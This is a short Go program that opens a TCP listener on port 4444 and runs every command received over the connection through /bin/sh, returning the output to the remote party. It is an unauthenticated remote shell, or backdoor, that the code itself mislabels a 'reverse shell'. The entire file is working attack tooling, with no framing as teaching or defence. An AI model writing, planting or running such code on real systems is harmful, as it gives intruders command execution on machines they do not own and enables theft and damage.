package main

import (
	"fmt"
	"net"
	"os/exec"
	"strings"
	"bufio"
)

func main() {
	port := 4444

	// Start a listener
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		fmt.Printf("Error starting listener: %s\n", err)
		return
	}
	defer listener.Close()

	fmt.Printf("Reverse shell listener started on port %d\n", port)

	// Accept incoming connections
	conn, err := listener.Accept()
	if err != nil {
		fmt.Printf("Error accepting connection: %s\n", err)
		return
	}
	defer conn.Close()

	fmt.Printf("Connection established from: %s\n", conn.RemoteAddr())

	// Send a welcome message
	fmt.Fprintln(conn, "Welcome to the reverse shell!")

	// Create a command scanner
	scanner := bufio.NewScanner(conn)

	// Loop to read and execute commands
	for {
		fmt.Fprint(conn, "> ") // Custom prompt

		// Read the command
		if !scanner.Scan() {
			break
		}
		command := scanner.Text()

		// Trim newline character from the command
		command = strings.TrimSpace(command)

		// Execute the command
		cmd := exec.Command("/bin/sh", "-c", command)
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn

		// Start the command
		err = cmd.Start()
		if err != nil {
			fmt.Printf("Error starting command: %s\n", err)
			break
		}

		// Wait for the command to finish
		err = cmd.Wait()
		if err != nil {
			fmt.Printf("Error waiting for command to finish: %s\n", err)
			break
		}
	}

	fmt.Println("Shell session closed")
}
